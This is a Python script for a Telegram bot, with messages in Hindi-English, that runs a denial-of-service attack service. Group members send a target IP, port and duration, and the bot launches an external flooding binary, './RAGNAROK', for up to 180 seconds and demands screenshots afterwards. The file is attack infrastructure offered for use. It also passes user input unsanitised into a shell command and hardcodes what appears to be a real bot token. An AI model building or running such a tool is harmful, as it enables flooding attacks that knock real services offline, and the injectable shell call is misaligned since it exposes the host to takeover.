#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
from telebot import types

# Telegram bot token (replace with actual token)
bot = telebot.TeleBot('8048715452:AAFrsfE0lRYuBV-1F-sL6RpfemFAfvqZ2xQ')

# Group and channel details
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"

# Global variables
is_attack_running = False
attack_end_time = None
pending_feedback = {}
update_thread = None

# Function to check if user is in channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Function to create check status button
def create_check_button():
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton("Check Status ✅", callback_data='check_status')
    markup.add(button)
    return markup

# Background function to update attack status
def update_attack_status(chat_id, message_id):
    global is_attack_running, attack_end_time

    while is_attack_running:
        remaining_time = max(0, (attack_end_time - datetime.datetime.now()).total_seconds())

        if remaining_time <= 0:
            is_attack_running = False
            attack_end_time = None  

            try:
                bot.edit_message_text(chat_id=chat_id, message_id=message_id, text="Attack Khatam! ✅ Ab screenshot bhej! 📸")
            except:
                pass  
            return

        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, 
                                  text=f"Attack chal raha hai... ⏳ Bacha hua time: {int(remaining_time)}s")
        except:
            pass  
        
        time.sleep(1)

# Handle attack command
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    global is_attack_running, attack_end_time, update_thread
    user_id = str(message.from_user.id)
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 Ye bot sirf group me chalega! ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ Pehle channel join kar! {CHANNEL_USERNAME}")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "Pehle screenshot bhej, warna naya attack nahi milega! 😡")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ Ek attack already chal raha hai! Check kar sakte ho /check !")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ Port aur Time number hone chahiye!")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 180s se zyada allowed nahi hai!")
        return

    confirm_msg = f"Attack Details:
🎯 Target: `{target}`
🔢 Port: `{port}`
⏳ Duration: `{time_duration}s`
Status: `Chal raha hai...`
📸 Attack ke baad screenshot bhejna zaroori hai!"

    msg = bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown", reply_markup=create_check_button())

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
    pending_feedback[user_id] = True  

    update_thread = threading.Thread(target=update_attack_status, args=(message.chat.id, msg.message_id))
    update_thread.start()

    bot.send_message(message.chat.id, f"🚀 Attack Shuru!
🎯 `{target}:{port}`
⏳ {time_duration}s
BETA SCREENSHOT BHEJ AB", parse_mode="Markdown")

    try:
        subprocess.run(f"./RAGNAROK {target} {port} {time_duration} CRACKS", shell=True, check=True)
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❌ Attack fail ho gaya!")
        is_attack_running = False
        attack_end_time = None
        update_thread = None  
        return

    bot.send_message(message.chat.id, "✅ Attack Khatam! 🎯
📸 Ab screenshot bhej, warna agla attack nahi milega!")

    is_attack_running = False
    attack_end_time = None
    update_thread = None  

# Handle /check command
@bot.message_handler(commands=['check'])
def handle_check(message):
    global is_attack_running, attack_end_time

    if is_attack_running and attack_end_time:
        remaining_time = max(0, (attack_end_time - datetime.datetime.now()).total_seconds())

        if remaining_time == 0:
            is_attack_running = False
            attack_end_time = None
            bot.reply_to(message, "✅ Koi attack active nahi hai!")
        else:
            bot.reply_to(message, f"⏳ Attack chal raha hai... Bacha hua time: {int(remaining_time)}s")
    else:
        bot.reply_to(message, "✅ Koi attack active nahi hai!")

# Handle screenshot submission
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)  
        bot.send_message(CHANNEL_USERNAME, f"📸 User `{user_id}` ka screenshot hai!")

        bot.reply_to(message, "✅ Screenshot mil gaya! Ab tu naya attack laga sakta hai. 🚀")
        del pending_feedback[user_id]  
    else:
        bot.reply_to(message, "❌ Ab screenshot bhejne ki zaroorat nahi hai!")

# Bot start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"🔥 Oye {user_name}! 🔥
🚀 Attack lagane ke liye group aur channel join kar!
🔗 Join Kar Abhi: [Telegram Group](https://t.me/R_SDanger_op) 🚀🔥"
    
    bot.reply_to(message, response, parse_mode="Markdown")

# Start polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)
